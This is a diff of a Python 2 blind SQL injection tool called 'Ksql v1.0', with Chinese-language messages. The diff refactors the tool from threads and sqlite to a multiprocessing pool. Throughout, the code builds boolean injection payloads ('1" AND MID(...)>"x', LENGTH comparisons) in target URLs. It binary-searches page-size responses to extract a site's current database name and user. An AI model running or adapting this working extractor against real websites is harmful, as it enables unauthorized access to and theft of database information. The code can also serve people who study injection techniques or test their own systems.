@@ -7,7 +7,7 @@ version:	Ksql 1.0
 """
 
 import sys, os, io, inspect, string, time, urllib, re, urlparse, difflib, chardet
-import filecmp, json, datetime, threading, sqlite3, timeit, getopt
+import filecmp, json, datetime, multiprocessing, getopt
 import xml.etree.ElementTree as ET
 from core import stdout
 from difflib import *
@@ -15,7 +15,6 @@ from time import ctime,sleep
 
 reload(sys)
 sys.setdefaultencoding('utf8')
-Timer = timeit.Timer()
 
 def modulePath():
 	try:
@@ -31,16 +30,15 @@ def htmlDecode(string):
 		pageInfo = chardet.detect(string)
 
 		tmpHtmlEncode = string.decode(pageInfo['encoding'])
-		
-		#获取系统编码
+
 		currentSystemEncoding = sys.getfilesystemencoding()
-		
+
 		tmpHtmlEncode = tmpHtmlEncode.encode(currentSystemEncoding)
-		
+
 	except Exception as e:
 		print "错误：在处理网页编码时遇到问题：" + str(e)
 		return
-		
+
 	return tmpHtmlEncode
 
 KSQL_ROOT_PATH   = modulePath()
@@ -53,30 +51,15 @@ QueriesRoot      = ET.parse(KSQL_ROOT_PATH + '/xml/queries.xml').getroot()
 QueriesDBMS      = QueriesRoot.find(DBMS)
 
 def createBinarySql(url, type, num, midval):
-	return (url.replace('[[[ID]]]', '1" AND MID(%s, %d, 1)>"%s' % (QueriesDBMS.find(type).get('query'), num, midval)), url.replace('[[[ID]]]', '1" AND MID(%s, %d, 1)<"%s' % (QueriesDBMS.find(type).get('query'), num, midval)))
+	return (
+		url.replace('[[[ID]]]', '1" AND MID(%s, %d, 1)>"%s' % (QueriesDBMS.find(type).get('query'), num, midval)), 
+		url.replace('[[[ID]]]', '1" AND MID(%s, %d, 1)<"%s' % (QueriesDBMS.find(type).get('query'), num, midval))
+	)
 
-
-sqlliteCon    = sqlite3.connect(':memory:', check_same_thread=False)
-#sqlliteCon    = sqlite3.connect(KSQL_ROOT_PATH + '/ksql.db', check_same_thread=False)
-sqlliteCursor = sqlliteCon.cursor()
-sqlliteCon.execute('drop table if exists info')
-sqlliteCon.commit()
-sqlliteCon.execute('create table info(id integer primary key autoincrement,type varchar(10) UNIQUE,value varchar(50))')
-sqlliteCon.execute('insert into info(type, value) values("--current-db", "")')
-sqlliteCon.execute('insert into info(type, value) values("--current-user", "")')
-sqlliteCon.commit()
-
-
-def run(type, tmpUrl, num, succPageSize, frontThread):
-	
-	if frontThread != None: 
-		frontThread.join()
-
+def worker(type, tmpUrl, num, succPageSize):
 	low = 0
 	high = len(ITOA64) - 1
-
-	while(low <= high):  
-
+	while(low <= high):
 		now = datetime.datetime.now()
 
 		mid = (low + high)/2  
@@ -95,11 +78,7 @@ def run(type, tmpUrl, num, succPageSize, frontThread):
 		elif len(htmlDecode(urllib.urlopen(highSql).read())) == succPageSize:
 			low = mid + 1
 		else:
-			sql = 'update info set value=value||"%s" where type="%s"' % (midval, type)
-			sqlliteCon.execute(sql)
-			sqlliteCon.commit()
-			stdout.printDarkGreen("[%s] [INFO] Hint %s \r\n" %(now.strftime('%H:%M:%S'), midval))
-			break
+			return midval
 
 def manage(type, url):
 	values = url.split('?')[-1]
@@ -118,7 +97,6 @@ def manage(type, url):
 	''' 猜解位数 '''
 	blindCount = 0
 	for num in range(1, MAX_BLIND_COUNT):
-
 		digitUrl = ''
 		if type == '--current-db':
 			digitUrl = tmpUrl.replace('[[[ID]]]', '1" AND LENGTH(' + QueriesDBMS.find('current_db').get('query') + ')="' + str(num))
@@ -129,27 +107,21 @@ def manage(type, url):
 			blindCount = num
 
 	''' Blind SQL Injection '''
-	threads = []
-	for num in range(1, blindCount+1):
-		if len(threads) == 0:
-			threads.append(threading.Thread(target=run,args=(type, tmpUrl, num, succPageSize, None)))
-		else:
-			threads.append(threading.Thread(target=run,args=(type, tmpUrl, num, succPageSize, threads[-1])))
+	pool = multiprocessing.Pool(processes=blindCount)
+	result = []
+	for num in range(blindCount):
+		result.append(pool.apply_async(worker, (type, tmpUrl, num+1, succPageSize)))
+	pool.close()
+	pool.join()
 
-	for item in threads:
-		item.setDaemon(True)
-		item.start()
-	item.join()
-
-
-	cursor = sqlliteCursor.execute('select value from info where type="%s"' % type)
-	checkRes = cursor.fetchone()
+	resultStr = ''
+	for res in result:
+		resultStr += res.get()
 
 	if type == '--current-db':
-		stdout.printDarkYellow('Databse: ' + checkRes[0] + "\r\n")
+		stdout.printDarkYellow('Databse: ' + resultStr + "\r\n")
 	elif type == '--current-user':
-		stdout.printDarkYellow('User: ' + checkRes[0] + "\r\n")
-
+		stdout.printDarkYellow('User: ' + resultStr + "\r\n")
 
 def Usage():
 	print 'Ksql.py usage:'
@@ -160,9 +132,6 @@ def Usage():
 
 def Version():
 	print 'Ksql v1.0'
-
-def OutPut(args):
-	print 'Hello, %s'%args
 
 def main(argv):
 	if len(argv) == 1:
@@ -202,9 +171,5 @@ def main(argv):
 			manage(item, url)
 
 
-
 if __name__ == '__main__':
 	main(sys.argv)
-	sqlliteCon.close()
-	stdout.printDarkYellow('Runtime: ' + str(Timer.timeit()))
-    
